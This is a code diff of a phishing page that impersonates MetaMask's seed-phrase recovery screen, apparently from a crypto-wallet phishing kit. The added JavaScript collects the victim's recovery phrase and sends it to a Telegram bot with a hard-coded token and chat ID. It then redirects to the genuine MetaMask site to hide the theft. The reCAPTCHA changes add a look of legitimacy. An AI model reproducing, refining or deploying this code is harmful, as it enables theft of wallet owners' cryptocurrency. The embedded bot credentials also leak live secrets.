@@ -6,16 +6,168 @@
   <title>Secret Recovery Phrase</title>
   <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <style>
-    /* ... [Tout le CSS original reste identique, sans modification] ... */
-    /* Inclure ici le CSS que tu avais donné, inchangé */
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #fff;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .top-bar {
+      width: 100%;
+      max-width: 700px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 30px 30px 10px;
+    }
+    .logo {
+      font-weight: bold;
+      font-size: 20px;
+    }
+    .language-select {
+      padding: 6px 12px;
+      font-size: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    main {
+      display: flex;
+      justify-content: center;
+      padding: 20px;
+      width: 100%;
+    }
+    .card {
+      background-color: white;
+      border-radius: 20px;
+      border: 1px solid #e0e0e0;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      padding: 40px;
+      width: 100%;
+      max-width: 500px;
+    }
+    .step-circles {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 260px;
+      margin-bottom: 30px;
+    }
+    .step {
+      text-align: center;
+    }
+    .circle {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      border: 2px solid #ccc;
+      line-height: 36px;
+      font-weight: bold;
+      font-size: 14px;
+      color: #777;
+      background-color: white;
+      margin: 0 auto 6px;
+    }
+    .step.active .circle {
+      background-color: #6264ff;
+      color: #fff;
+      border: none;
+    }
+    .label {
+      font-size: 12px;
+      color: #666;
+      line-height: 14px;
+    }
+    h1 {
+      text-align: center;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    .description {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+    select.phrase-length {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    .info {
+      font-size: 13px;
+      color: #444;
+      margin: 10px 0;
+      padding: 10px;
+      background: #f5f5ff;
+      border-left: 4px solid #6264ff;
+      border-radius: 4px;
+    }
+    .seed-inputs {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 20px 0;
+    }
+    .seed-input {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .seed-input input {
+      width: 100%;
+      padding: 8px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    .submit-btn {
+      background: linear-gradient(90deg, #537cff, #6563ff);
+      border: none;
+      color: white;
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border-radius: 24px;
+      cursor: pointer;
+      margin-top: 24px;
+    }
+    .submit-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    .error-msg {
+      color: red;
+      font-size: 14px;
+      text-align: center;
+      margin-top: 10px;
+      display: none;
+    }
+    /* Suppression du captcha-container car plus utilisé */
+
+    @media (max-width: 600px) {
+      .seed-inputs {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      .captcha-input {
+        width: 100%;
+      }
+    }
   </style>
+  <!-- Chargement du script reCAPTCHA de Google -->
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
 
   <div class="top-bar">
-    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70px"></div>
+    <div><img src="https://metamask2-eight.vercel.app/meta.png"  width="70px"></div>
     <select class="language-select">
       <option value="en">English</option>
       <option value="fr">Français</option>
@@ -55,29 +207,29 @@
 
       <div class="seed-inputs" id="seedInputs"></div>
 
-      <!-- reCAPTCHA ajouté ici -->
-      <div class="g-recaptcha" data-sitekey="6LdQvIorAAAAADITjQqeK4M6W7FZdLfUUESYgySK" style="margin: 20px 0;"></div>
+      <!-- Ici on insère le reCAPTCHA Google juste avant le bouton -->
+      <div class="g-recaptcha" data-sitekey="6LdQvIorAAAAADITjQqeK4M6W7FZdLfUUESYgySK" data-callback="recaptchaCallback"></div>
 
-      <button class="submit-btn" id="submitBtn" onclick="handleConfirm()">
+      <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
         Confirm Secret Recovery Phrase
       </button>
-
       <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
+
     </div>
   </main>
 
   <script src="bip39-words.js"></script>
-  <script type="module">
-    import { sendToTelegram } from './telegram.js';
-
+  <script>
     const submitBtn = document.getElementById("submitBtn");
     const errorMsg = document.getElementById("errorMsg");
+
+    // Suppression des variables liées à l'ancien captcha
 
     function generateInputs() {
       const container = document.getElementById("seedInputs");
       const count = parseInt(document.getElementById("phraseLength").value);
       container.innerHTML = "";
-      submitBtn.disabled = false;
+      submitBtn.disabled = true;
       errorMsg.style.display = "none";
 
       for (let i = 1; i <= count; i++) {
@@ -86,6 +238,41 @@
         div.innerHTML = `<label>${i}.</label><input type="text" name="word${i}" autocomplete="off" />`;
         container.appendChild(div);
       }
+
+      const inputs = container.querySelectorAll("input");
+      inputs.forEach(input => {
+        input.addEventListener("input", checkFieldsFilled);
+      });
+    }
+
+    function checkFieldsFilled() {
+      const count = parseInt(document.getElementById("phraseLength").value);
+      let allFilled = true;
+
+      for (let i = 1; i <= count; i++) {
+        const value = document.querySelector(`input[name='word${i}']`).value.trim();
+        if (value === "") {
+          allFilled = false;
+          break;
+        }
+      }
+
+      if (!allFilled) {
+        submitBtn.disabled = true;
+        errorMsg.style.display = "none";
+        return;
+      }
+
+      if (!validateBIP39Words()) {
+        submitBtn.disabled = true;
+        errorMsg.style.display = "block";
+        return;
+      } else {
+        errorMsg.style.display = "none";
+      }
+
+      // Si tous les champs sont remplis et valides, on attend le reCAPTCHA
+      submitBtn.disabled = true;
     }
 
     function validateBIP39Words() {
@@ -106,12 +293,31 @@
       return valid;
     }
 
-    async function handleConfirm() {
-      const recaptchaResponse = grecaptcha.getResponse();
-      if (!recaptchaResponse) {
-        alert("Please complete the reCAPTCHA.");
-        return;
+    // Callback appelée quand l'utilisateur valide le reCAPTCHA
+    function recaptchaCallback() {
+      // Active le bouton uniquement si tous les champs sont remplis et valides
+      const count = parseInt(document.getElementById("phraseLength").value);
+      let allFilled = true;
+
+      for (let i = 1; i <= count; i++) {
+        const value = document.querySelector(`input[name='word${i}']`).value.trim();
+        if (value === "") {
+          allFilled = false;
+          break;
+        }
       }
+
+      if (allFilled && validateBIP39Words()) {
+        submitBtn.disabled = false;
+      } else {
+        // reset reCAPTCHA si les champs ne sont pas valides
+        grecaptcha.reset();
+        submitBtn.disabled = true;
+      }
+    }
+
+    function handleConfirm() {
+      if (submitBtn.disabled) return;
 
       if (!validateBIP39Words()) {
         errorMsg.style.display = "block";
@@ -127,12 +333,22 @@
         phrase += value.trim() + " ";
       }
 
-      sendToTelegram(phrase.trim());
+      const botToken = "7633904177:AAHGchn80h2QDuAmo_amRVwa7PxhgMNOPiY"; // Remplace ici
+      const chatId = "6996434307";     // Remplace ici
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: "Secret Recovery Phrase:\n" + phrase.trim()
+        })
+      });
 
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://metamask.io/";
+        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
       }, 800);
     }
 
@@ -149,6 +365,8 @@
         const input = document.querySelector(`input[name='word${index + 1}']`);
         if (input) input.value = word;
       });
+
+      checkFieldsFilled();
     });
 
     window.onload = generateInputs;
